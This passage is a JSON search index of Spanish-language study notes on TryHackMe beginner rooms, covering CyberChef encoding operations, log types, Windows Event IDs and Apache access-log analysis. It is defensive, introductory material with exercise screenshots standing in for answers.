haciéndolos más eficientes y menos susceptibles de error humano.\n\n- **Python:** Lenguaje de scripting enfocado en la automatización con módulos y herramientas.\n- **PowerShell Empire:** Framework para la post-explotación PowerShell.\n\n--------------------------------\n<h2>Suite Sysinternals</h2>\nLa Suite Sysinternals es una colección de utilidades de sistema avanzadas diseñada para ayudar a los profesionales de IT y desarrolladores a dirigir, resolver problemas y diagnosticar los sistemas Windows.\n\n- **Autoruns:** Muestra lo que lo ejecutables están configurados para hacer durante el arranque del sistema.\n- **Process Explorer:** Ofrece información sobre procesos corriendo.\n- **Process Monitor:** Monitoriza y registra procesos y actividades de hilos en tiempo real.\n\nTranquilo que no vamos a ver todas las herramientas, sólo queremos que veas cómo es tener una caja con herramientas que pueden hacer tantas cosas."
  },
  {
    "title": "0. CyberChef - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/0-cyberchef-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/0. CyberChef - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/1. Introduction]]\n[[2. Accessing the Tool]]\n[[3. Navigating the Interface]]\n[[4. Before Anything Else]]\n[[5. Practice, Practice, Practice]]\n[[6. Your First Official Cook]]\n"
  },
  {
    "title": "5. Practice, Practice, Practice",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/5-practice-practice-practice/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/5. Practice, Practice, Practice.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Como queremos prepararte bien, exploraremos en esta tarea las categorías de operaciones más usadas.\n\n-------------------------------\n<h2>Extractores</h2>\nLas operaciones específicas mencionadas en la tabla recaen bajo la categoría de Extractores.\n\n| Específico              | Descripción                                                                                             |\n| ----------------------- | ------------------------------------------------------------------------------------------------------- |\n| Extract IP addresses    | Extrae direcciones IPv4 e IPv6.                                                                         |\n| Extract URLs            | Extrae URLs del input, se requiere el protocolo (HTTP, FTP, etc.). Si no habrá muchos falsos positivos. |\n| Extract email addresses | Extrae todas las direcciones de mail del input.                                                         |\n\n-----------------------------\n<h2>Fecha y Hora</h2>\nLas operaciones específicas mencionadas en la tabla recaen bajo la categoría de Fecha y Hora.\n\n| Específico          | Descripción                                                                         |\n| ------------------- | ----------------------------------------------------------------------------------- |\n| From UNIX Timestamp | Convierte timestamp UNIX a string fecha y hora.                                     |\n| To UNIX Timestamp   | Parsea una string fecha y hora en UTC y devuelve el correspondiente timestamp UNIX. |\nUn timestamp UNIX es un valor de 32 bits que representa el número de segundos desde el 1 de Enero de 1970\n\n-----------------------\n<h2>Formato de la Información</h2>\nLas operaciones específicas mencionadas en la tabla recaen bajo la categoría de Formato de la Información.\n\n| Operations  | Description                                     | Examples                                                                                        |\n| ----------- | ----------------------------------------------- | ----------------------------------------------------------------------------------------------- |\n| From Base64 | Decodea Base64 a texto raw                      | `V2VsY29tZSB0byB0cnloYWNrbWUh` se vuelve `Welcome to tryhackme!`                                |\n| URL Decode  | Convierte caracteres URL encodeados a texto raw | `https%3A%2F%2Fgchq%2Egithub%2Eio%2FCyberChef%2F` se vuelve `https://gchq.github.io/CyberChef/` |\n| From Base85 | Decodea información de una string ASCII         | `BOu!rD]j7BEbo7` se vuelve `hello world`                                                        |\n| From Base58 | Decodea como base64                             | `AXLU7qR` se vuelve`Thm58`                                                                      |\n| To Base62   | Encodea usando un set restringido de símbolos   | `Thm62` se vuelve`6NiRkOY`                                                                      |\nOperaciones como `Base(64, 85, 58,62)` son conocidas como \"Base Encodings\". Estos toman información en binario (0s y 1s) y lo transforman en una representación basada en texto usando un set de caracteres ASCII específicos.\n\n--------------------------------------\n<h2>Ejemplo</h2>\nVeamos la operación más usada, `Base64`:\n\nNuestro ejemplo será encodear las letras \"**THM**\". Para eso usamos la tabla ASCII. Si quieres ver la tabla ASCII completa haz click en este [link](https://en.wikipedia.org/wiki/ASCII).\n\n| Decimal | Binary   | Symbol |\n| ------- | -------- | ------ |\n| 65      | 01000001 | A      |\n| 66      | 01000010 | B      |\n| 67      | 01000011 | C      |\n| 68      | 01000100 | D      |\n| 69      | 01000101 | E      |\n| 70      | 01000110 | F      |\n| 71      | 01000111 | G      |\n| 72      | 01001000 | H      |\n| 73      | 01001001 | I      |\n| 74      | 01001010 | J      |\n| 75      | 01001011 | K      |\n| 76      | 01001100 | L      |\n| 77      | 01001101 | M      |\n| 78      | 01001110 | N      |\n| 79      | 01001111 | O      |\n| 80      | 01010000 | P      |\n| 81      | 01010001 | Q      |\n| 82      | 01010010 | R      |\n| 83      | 01010011 | S      |\n| 84      | 01010100 | T      |\n| 85      | 01010101 | U      |\n| 86      | 01010110 | V      |\n| 87      | 01010111 | W      |\n| 88      | 01011000 | X      |\n| 89      | 01011001 | Y      |\n| 90      | 01011010 | Z      |\n<h4>Paso 1: Convertir a Binario y Fusionar</h4>\nBasándonos en la tabla de arriba, **T = 01010100**, **H=01001000**, **M = 01001101**. Ahora los concatenamos y nos aseguramos de que son 24 caracteres: `010101000100100001001101`.\n\n-------------------------------\n<h4>Paso 2: Dividir y Convertir a Decimal</h4>\nSeparamos `010101000100100001001101` en grupos de 6 caracteres cada uno. Nos quedan: `010101`, `000100`, `100001` y `001101`. Ahora hay que convertirlos en decimal:\n\n| Binario | Decimal  |\n| ------- | -------- |\n| 010101  | 21       |\n| 000100  | 4        |\n| 100001  | 33       |\n| 001101  | 13       |\n\n-------------------------------\n<h4>Paso 3: Convertir a Base64</h4>\nAhora que tenemos los números del paso anterior, buscamos su equivalente en la tabla siguiente:\n\n| Index | Character |\n| ----- | --------- |\n| 0     | **A**     |\n| 1     | **B**     |\n| 2     | **C**     |\n| 3     | **D**     |\n| 4     | **E**     |\n| 5     | **F**     |\n| 6     | **G**     |\n| 7     | **H**     |\n| 8     | **I**     |\n| 9     | **J**     |\n| 10    | **K**     |\n| 11    | **L**     |\n| 12    | **M**     |\n| 13    | **N**     |\n| 14    | **O**     |\n| 15    | **P**     |\n| 16    | **Q**     |\n| 17    | **R**     |\n| 18    | **S**     |\n| 19    | **T**     |\n| 20    | **U**     |\n| 21    | **V**     |\n| 22    | **W**     |\n| 23    | **X**     |\n| 24    | **Y**     |\n| 25    | **Z**     |\n| 26    | **a**     |\n| 27    | **b**     |\n| 28    | **c**     |\n| 29    | **d**     |\n| 30    | **e**     |\n| 31    | **f**     |\n| 32    | **g**     |\n| 33    | **h**     |\n| 34    | **i**     |\n| 35    | **j**     |\n| 36    | **k**     |\n| 37    | **l**     |\n| 38    | **m**     |\n| 39    | **n**     |\n| 40    | **o**     |\n| 41    | **p**     |\n| 42    | **q**     |\n| 43    | **r**     |\n| 44    | **s**     |\n| 45    | **t**     |\n| 46    | **u**     |\n| 47    | **v**     |\n| 48    | **w**     |\n| 49    | **x**     |\n| 50    | **y**     |\n| 51    | **z**     |\n| 52    | **0**     |\n| 53    | **1**     |\n| 54    | **2**     |\n| 55    | **3**     |\n| 56    | **4**     |\n| 57    | **5**     |\n| 58    | **6**     |\n| 59    | **7**     |\n| 60    | **8**     |\n| 61    | **9**     |\n| 62    | **+**     |\n| 63    | **/**     |\nTransformamos:\n\n|Index|Characters|\n|---|---|\n|21|V|\n|4|E|\n|33|h|\n|13|N|\nCombinando estos caracteres obtenemos que `THM` en Base64 es `VEhN`.\n\nVeamos ahora el `URL Decode`. Esto funciona convirtiendo los caracteres encodeados con porcentaje de vuelta a sus valores originales. Para una referencia de estos valores puedes consultar este [link](https://en.wikipedia.org/wiki/Percent-encoding). El set de caracteres por defecto en `HTML5` es `UTF-8`. Aquí una tabla con caracteres que sueles ver en las URLs:\n\n| Characters | From UTF-8 |\n| ---------- | ---------- |\n| :          | %3A        |\n| /          | %2F        |\n| .          | %2E        |\n| =          | %3D        |\n| #          | %23        |\n\n-------------------------------------\n<h2>Ejercicio Práctico</h2>\nDescarga el archivo de ejercicio. Una vez descargado puedes copiar y pegar el contenido en el `Input` o usar `Open file as input`.\n\n1. Abrimos el archivo en CyberChef:\n   ![[Pasted image 20251026145256.png]]\n2. Arrastramos el `Extract email addresses` en el apartado de `Extractors` y como tenemos `Auto Bake` seleccionado lo vemos instantáneamente:\n   ![[Pasted image 20251026145409.png]]\n3. Hacemos lo mismo para la IP:\n   ![[Pasted image 20251026145503.png]]\n4. Y para el dominio:\n   ![[Pasted image 20251026145542.png]]\n5. Para convertir un número en otro usamos los conversores de decimal a binario de `Data Format`:\n   ![[Pasted image 20251026145754.png]]\n6. Del apartado de `Networking` cogemos `URL Encode` y seleccionamos que encodee todos los caracteres especiales:\n   ![[Pasted image 20251026150052.png]]"
  },
  {
    "title": "2. Accessing the Tool",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/2-accessing-the-tool/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/2. Accessing the Tool.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Hay varias maneras de acceder a CyberChef. Veamos las dos más convenientes.\n\n-------------------------------\n<h2>Acceso Online</h2>\nTodo lo que necesitas es buscar en el navegador CyberChef o hacer click en este [link](https://gchq.github.io/CyberChef/).\n\n-------------------------------\n<h2>Copia Offline o Local</h2>\nPuedes correr la copia local descargando la última versión en este [link](https://github.com/gchq/CyberChef/releases). Esto funciona en Windows y Linux. Como buena praxis, deberías descargarte la versión más estable.\n\n"
  },
  {
    "title": "3. Navigating the Interface",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/3-navigating-the-interface/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/3. Navigating the Interface.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "CyberChef consiste de 4 áreas. Cada una de estas tiene diferentes componentes o funcionalidades. Las cuatro áreas son:\n\n1. Operaciones\n2. Receta\n3. Input\n4. Output\n\n![[Pasted image 20251026130851.png]]\n\nVeamos lo que hace cada una de ellas.\n\n---------------------------------\n<h2>Operaciones</h2>\nRepositorio práctico de todas las operaciones que CyberChef está equipado para hacer. Estas operaciones se categorizan meticulosamente, ofreciendo a los usuarios acceso a varias capabilidades.\n\nAquí unas de las operaciones que verás durante tu trayectoria:\n\n| Operaciones     | Descripción                                                  | Ejemplos                                                                                                                                                                                 |\n| --------------- | -------------------------------------- | ---------------------------------------------|\n| From Morse Code | Traduce código morse a caracteres alfanuméricos en mayúscula | `- .... .-. . .- - ...` se transforma en `THREATS`                                                                                                                                       |\n| URL Encode      | Codifica caracteres especiales en su forma URL               | `https://tryhackme.com/r/room/cyberchefbasics` se convierte en `https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics`                                                              |\n| To Base64       | Codifica información raw en base64                           | `This is fun!` se convierte en `VGhpcyBpcyBmdW4h`                                                                                                                                        |\n| To Hex          | Convierte el inut en formato hexadecimal                     | `This Hex conversion is awesome!` se convierte en `54 68 69 73 20 48 65 78 20 63 6f 6e 76 65 72 73 69 6f 6e 20 69 73 20 61 77 65 73 6f 6d 65 21`                                         |\n| To Decimal      | Convierte el input en un array de decimales                  | `This Decimal conversion is awesome!` se convierte en `84 104 105 115 32 68 101 99 105 109 97 108 32 99 111 110 118 101 114 115 105 111 110 32 105 115 32 97 119 101 115 111 109 101 33` |\n| ROT13           | Sustitución César simple                                     | `Digital Forensics and Incident Response` se convierte en `Qvtvgny Sberafvpf naq Vapvqrag Erfcbafr`                                                                                      |\n\n-------------------------------\n<h2>Receta</h2>\nSe considera el corazón de la herramienta. Aquí puedes seleccionar, ordenar y ajustar las operaciones para que cumplan tus necesidades. Aquí es donde tomas control, definiendo el argumento de cada operación. En esta área puedes arrastrar las operaciones que quieres usar y especificar argumentos y opciones.\n\nLas funcionalidades incluyen:\n\n- `Save recipe`: Te permite guardar las operaciones seleccionadas.\n- `Load recipe`: Te permite cargar una receta previamente guardada.\n- `Clear recipe`: Te permite limpiar las recetas elegidas durante un uso.\n\nLas puedes encontrar en los iconos:\n\n![[Pasted image 20251026132259.png]]\n\nLa parte de abajo es `BAKE!` que significa ornear. Esto procesa la información con la receta dada.\n\nAdicionalmente, puedes marcar la opción `Auto Bake`, lo que te permite cocinar la receta seleccionada sin necesidad de darle a Bake constantemente.\n\n--------------------------------\n<h2>Input</h2>\nOfrece un espacio donde puedes introducir fácilmente texto o archivos pegando, arrastrando o escribiendo directamente para realizar operaciones sobre ellos.\n\n![[Pasted image 20251026133558.png]]\n\nAdemás, tiene las siguientes funcionalidades:\n\n- `Add a new input tab`: Aquí es donde la pestaña adicional se crea para que el usuario use diferentes valores de la pestaña anterior.\n  ![[Pasted image 20251026133604.png]]\n- `Open folder as input`: Esta funcionalidad permite subir un directorio entero como valor de input.\n  ![[Pasted image 20251026133615.png]]\n- `Open file as input`: Permite subir un archivo como input.\n  ![[Pasted image 20251026133629.png]]\n- `Clear input and output`: Esta funcionalidad permite al usuario limpiar cualquier valor de input insertados y su correspondiente valor output.\n- `Reset pane layout`: Esta funcionalidad trae la interfaz de herramientas a su valor de tamaño por defecto.\n\n------------------------------------\n<h2>Output</h2>\nEs un espacio visual que muestra la información procesada. Presenta la salida de la receta de forma limpia y ordenada.\n\n![[Pasted image 20251026133637.png]]\n\nLas funcionalidades incluyen:\n\n- `Save output to file`: Permite guardar los resultados en un archivo.\n- `Copy raw output to the clipboard`: Esta funcionalidad permite a los usuarios copiar output raw directamente a la clipboard, permitiendo que lo peguen en cualquier sitio rápidamente.\n- `Replace input with output`: Permite a los usuarios sobrescribir rápidamente la información de input basada en los resultados de la operación.\n- `Maximise output pane`: Devuelve la interfaz de herramientas a su tamaño por defecto."
  },
  {
    "title": "6. Your First Official Cook",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/6-your-first-official-cook/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/6. Your First Official Cook.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Esta tarea nos permite aplicar lo que hemos aprendido en tareas anteriores. Utilizaremos CyberChef para responder a las preguntas.\n\n- Using the file you downloaded in Task 5, which IP starts and ends with \"10\"?\n  ![[Pasted image 20251026150818.png]]\n- What is the base64 encoded value of the string \"**Nice Room!**\"?\n  ![[Pasted image 20251026150930.png]]\n- What is the URL decoded value for `https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics`?\n  ![[Pasted image 20251026151008.png]]\n- What is the datetime string for the Unix timestamp `1725151258`?\n  ![[Pasted image 20251026151348.png]]\n- What is the Base85 decoded string of the value `<+oue+DGm>Ap%u7`?\n  ![[Pasted image 20251026151436.png]]"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "CyberChef es una aplicación simple, intuitiva y basada en web diseñada para ayudar con varias operaciones en tu navegador. Piensa en una navaja suiza para la información, como tener una caja de herramientas con diferentes herramientas diseñadas para tareas específicas. Estas tareas fluctúan desde encodings simples, como XOR o Base64 hasta operaciones complejas como encriptación AES o desencriptación RSA. CyberChef opera con recetas, una serie de instrucciones ejecutadas en orden.\n\n----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Aprender lo que es CyberChef\n- Aprender a cómo navegar su interfaz\n- Entender operaciones comunes\n- Aprender cómo crear recetas y procesar información\n\n-----------------------------\n<h2>Pre-requisitos</h2>\n- [[0. Hashing Basics]]\n- [[0. Cryptography Basics]]\n"
  },
  {
    "title": "4. Before Anything Else",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/4-before-anything-else/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/4. Before Anything Else.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Tranquilidad! Antes de ir al meollo, veamos rápidamente el proceso de pensamiento al usar CyberChef. Este proceso consiste de cuatro pasos diferentes:\n\n![[Pasted image 20251026134118.png]]\nVeamos cada paso un poco en detalle.\n\nAcordar un objetivo clave es esencial. Este paso incluye definir metas específicas y conseguibles. Ayuda a responder a la pregunta: **\"¿Qué quiero lograr?\"**. Los objetivos son vitales para ofrecer dirección, propósito y enfoque en las metas.\n\nEn el segundo paso es donde pegas o introduces la información que posees.\n\nEl tercer paso es seleccionar las operaciones que quieres usar. Esto puede ser difícil, especialmente si no estás familiarizado con lo que estás lidiando.\n\nPor último, comprobamos el output de CyberChef. Esto responde a la pregunta: **\"¿Hemos conseguido nuestro objetivo?\"**. Si no lo hemos conseguido puede estar bien volver al paso 3 para volver a intentarlo o incluso al 1, para replantearnos las metas.\n\nUn ejemplo:\n\n![[Pasted image 20251026134700.png]]\n"
  },
  {
    "title": "4. Web Server Access Logs Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/4-web-server-access-logs-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/4. Web Server Access Logs Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Interactuamos con múltiples sitios web a diario. A veces, sólo queremos ver el sitio web y aveces registrarnos o iniciar sesión en sus servicios. Esto son dos tipos de peticiones al sitio web. Estas peticiones se guardan en archivos de log en el servidor que corre esa página.\n\nEste archivo de logs contiene todas las peticiones hechas a la página web junto con información en el marco de tiempo, la IP que hace la petición, el tipo de petición y la URL. Aquí abajo podemos ver los campos tomados de un log de ejemplo de un servidor web Apache que puede ser encontrado en el directorio: `/var/log/apache2/access.log`.\n\n- **IP Address:** “172.16.0.1” - The IP address of the user who made the request.\n    \n- **Timestamp:** “[06/Jun/2024:13:58:44]” - The time when the request was made to the website.\n    \n- **Request:** The request details.\n    \n    - **HTTP Method:** “GET” - Tells the website what action to be performed on the request.\n    - **URL:** “/” - The requested resource.\n- **Status Code:** “200” - The response from the server. Different numbers indicate different response results.\n    \n- **User-Agent:** “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36” - Information about the user’s Operating System, browser, etc. when making the request.\n\nPodemos realizar un análisis manual usando algunas utilidades de línea de comandos. Los siguientes, son comandos útiles durante un análisis manual:\n\n- `cat`: Sirve para mostrar el línea de comandos los contenidos de un archivo.\n- `grep`: Sirve para filtrar por cadenas de texto o patrones.\n- `less`: Cuando trabajamos con varias páginas nos permite ver página a página. Para avanzar usamos `barra espaciadora` y para volver atrás `b`. Si queremos buscar escribimos `/` y `n` para ir a la siguiente concurrencia y `N` a la anterior.\n\n----------------------------\n<h2>Ejercicio</h2>\nAnalizar un documento de logs de acceso web a un servidor:\n\n1. Descargamos el archivo:\n   ![[Pasted image 20251022185121.png]]\n2. Leemos el contenido del archivo:\n   ![[Pasted image 20251022185341.png]]\n3. Como es muy grande empezamos a filtrar:\n   ![[Pasted image 20251022185514.png]]\n4. Filtramos otra vez:\n   ![[Pasted image 20251022185645.png]]\n\n"
  },
  {
    "title": "1. Introduction to Logs",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/1-introduction-to-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/1. Introduction to Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Los atacantes son inteligentes. Para evitar ser detectados evitan dejar rastros en el lado de la víctima. Aún así, el quipo de seguridad determina cómo se ejecutó el ataque y a veces resulta exitoso en averiguar quién está detrás del ataque.\n\nEn un caso real de investigación de policía, las pistas juegan un papel fundamental en la resolución del caso. Pero y en el mundo digital, ¿dónde se encuentran esas pistas y rastros? Hay varios sitios en un sistema donde pueden quedar registrados losgs o rastros. Los logs son las huellas del mundo digital. Seguir el rastro del la actividad y saber que usuario hizo qué cosa es posible gracias a los logs.\n\n-----------------------------\n<h2>Casos de Uso</h2>\nAquí vemos algunas areas clave donde los logs juegan un rol integral:\n\n| Caso de Uso                          | Descripción                                                                                                      |\n| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |\n| Security Events Monitoring           | Los logs nos ayudan a detectar comportamiento inusual cuando usamos monitorización en tiempo real.               |\n| Incident Investigation and Forensics | Los logs son los rastros detrás de cada indicio. Ofrecen información detallada de qué pasó durante el incidente. |\n| Troubleshooting                      | Como los logs también recogen errores de sistema o aplicaciones, pueden usarse para resolver problemas.          |\n| Performance Monitoring               | Pueden ofrecer una vista valiosa dentro de las aplicaciones de rendimiento.                                      |\n| Auditing and Compliance              | Juegan un rol importante en la auditoría y cumplimiento legal.                                                   |\n\n------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nDespués de completar esta unidad habrás aprendido lo siguiente:\n\n- Los diferentes tipos de logs.\n- Cómo analizar logs.\n- Analizar Logs de Eventos en Windows.\n- Analizar Logs de Acceso Web.\n\n"
  },
  {
    "title": "2. Types of Logs",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/2-types-of-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/2. Types of Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "En la tarea anterior hemos visto varios casos de uso de los logs. Esto es un reto, imagina que tienes que investigar un problema con un sistema a través de logs. Abres el archivo de logs del sistema y te abruma la cantidad de logs que hay.\n\nAquí esta la solución: Los logs se segregan en diferentes categorías dependiendo del tipo de información  que ofrecen. Así que ahora ya sólo tienes que mirar dentro del archivo log específico para el que el problema se relaciona. Veamos algunos tipos:\n\n| Tipo de Log      | Uso                                                                                                                                      |\n| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |\n| System Logs      | Útiles en la resolución de problemas. Ofrecen información de varias actividades del sistema operativo.                                   |\n| Security Logs    | Ayudan a detectar e investigar incidentes. Estos logs ofrecen información sobre actividades relacionadas con la seguridad en el sistema. |\n| Application Logs | Los logs de aplicación contienen eventos específicos relacionados con la aplicación.                                                     |\n| Audit Logs       | Ofrecen información detallada sobre los cambios del sistema y eventos de usuario.                                                        |\n| Network Logs     | Ofrecen información sobre el tráfico entrante y saliente de la red.                                                                      |\n| Access Logs      | Ofrecen información detellada sobre el acceso a difrentes recursos.                                                                      |\n\n>[!NOTE] Puede haber muchos más tipos de logs dependiendo en el servicio y en la aplicación que sirve.\n\nAhora que ya entendemos qué son esstos logs y cómo varios tipos de logs pueden ser útiles en diferentes escenarios, veamos cómo podemos analizar estos logs para extraer la información requerida de ellos. Como hacer el análisis es extremadamente complicado para el ojo humano, contamos con herramientas manuales y automáticas para hacerlo posible."
  },
  {
    "title": "0. Logs Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/0-logs-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/0. Logs Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "[[1. Introduction to Logs]]\n[[2. Types of Logs]]\n[[3. Windows Event Logs Analysis]]\n[[4. Web Server Access Logs Analysis]]\n"
  },
  {
    "title": "3. Windows Event Logs Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/3-windows-event-logs-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/3. Windows Event Logs Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Como otros sistemas operativos, Windows OS también registra muchas de las actividades que toman lugar. Estos se almacenan en archivos de log segregados, cada uno con una categoría. Algunos de los tipos de logs cruciales son:\n\n- **Aplicaciones:** Hay muchas aplicaciones correndo en el sistema operativo. Cualquier información relacionada con estas aplicaciones se registra en este archivo.\n- **Sistema:** El sistema operativo tiene diferentes operaciones corriendo. Cualquier información relacionada con estas operacioness se registra en este archivo.\n- **Seguridad:** Es el archivo de log más importante de Windows. Registra cualquier actividad relacionada con la seguridad.\n\nA parte de estos, muchos otros archivos de log en Windows están diseñados para registrar actividades relacionadas a acciones y aplicaciones específicas .\n\nAl contrario que otros archivos de log estudiados en las teras anteriores, Windows tiene una utilidad llamada Event Viewer, que nos da una interfaz gráfica para ver y buscar logs.\n\nPara abrirlo, hacemos click en el botón de Windows y escribimos 'Event Viewer' y abrirá el Visor de Eventos. La parte en amarillo muestra los diferentes logs disponibles.\n\n![[Pasted image 20251022164251.png]]\n\nSi haces click en `Windows Logs`, verás los diferentes tipos de logs que hemos visto al comienzo de la actividad. La primera porción resaltada muestra los diferentes tipos de logs. Cuando hacemos click en uno de ellos, veremos los diferentes logs, como se ve en la segunda parte resaltada. Finalmente, en la tercera porción tenemos diferentes opciones de análisis de logs.\n\n![[Pasted image 20251022165814.png]]\n\nVeamos el contenido de alguno de ellos:\n\n![[Pasted image 20251022165832.png]]\n\nAsí es como un log de evento se ve en Windows. Tiene diferentes campos, pero veremos los siguientes:\n\n- **Description:** Este campo tiene información detallada de la actividad.\n- **Log Name:** Indica el nombre del archivo log.\n- **Logged:** Indica la hora de la actividad.\n- **Event ID:** Los IDs de eventos son identificadores únicos de una actividad específica.\n\nNumerosos IDs de evento están disponibles en los logs de eventos de Windows. Podemos usar estos IDs para buscar cualquier actividad en específico. Por ejemplo, el evento ID 4624 identifica una actividad de inicio de sesión exitoso, por lo que sólo necesitamos buscar 4624 al investigar un inicio de sesión exitoso.\n\nAquí hay una tabla de IDs de eventos importantes:\n\n| Event ID | Description                                           |\n| -------- | ----------------------------------------------------- |\n| 4624     | Un usuario ha iniciado sesión de forma exitosa.       |\n| 4625     | Un usuario ha fallado el intento de inicio de sesión. |\n| 4634     | Una cuenta de usuario se cerró exitosamente.          |\n| 4720     | Una cuenta de usuario fue creada.                     |\n| 4724     | Se intentó resetear la contraseña de un usuario.      |\n| 4722     | Se habilitó una cuenta de usuario.                    |\n| 4725     | Se deshabilitó una cuenta de usuario.                 |\n| 4726     | Se borró una cuenta de usuario.                       |\nHay muchos más IDs de eventos. No es necesario recordarlos todos pero es bueno conocer algunos clave.\n\nEl visor de eventos nos permite buscar entre los logs relacionados a un ID de evento específico con la funcionalidad `Filter Current Log`. Podemos hacer click en esta funcionalidad para aplicar cualquier filtro:\n\n![[Pasted image 20251022175353.png]]\n\nCuando hacemos click en `Filter Current Log`, se nos pedirá ingressar el ID de evento que queremos filtrar. Aquí debajo un ejemplo del filtrado por ID `4624`:\n\n![[Pasted image 20251022175549.png]]\n![[Pasted image 20251022175603.png]]\n\n------------------------------\n<h2>Ejercicio</h2>\nEl viernes, una rganización crítica reportó haber sido víctima de un ciberataque. En la investigación se encontró que información crítica fue exfiltrada de un servidor de archivos de la red de la organización. El equipo de seguridad determinó exitosamente el nombre y la IP del usuario del sistema comprometido en la red, que tuvo acceso a dicho servidor.\n\nTu trabajo es investigar y encontrar las actividades del atacante en este sistema comprometido antes de que ganase acceso al servidor.\n\n1. Entramos en la máquina por `xfreerdp3`:\n   ![[Pasted image 20251022181211.png]]\n   ![[Pasted image 20251022181536.png]]\n2. Entramos en el Event Viewer:\n   ![[Pasted image 20251022181658.png]]\n3. Buscamos por código 4720 para ver las cuentas creadas:\n   ![[Pasted image 20251022181848.png]]\n4. Pinchamos en la última creada y miramos el nombre de usuario de la nueva cuenta:\n   ![[Pasted image 20251022182049.png]]\n5. Miramos quién creó la cuenta:\n   ![[Pasted image 20251022182131.png]]\n6. Miramos cuándo se activó la cuenta:\n   ![[Pasted image 20251022182321.png]]\n7. Filtramos por código `4724` parra ver intentos de cambios de contraseña:\n   ![[Pasted image 20251022182632.png]]\n8. Vemos que efectivamente sí que se cambió:\n   ![[Pasted image 20251022182714.png]]\n\n"
  },
  {
    "title": "5. Technology",
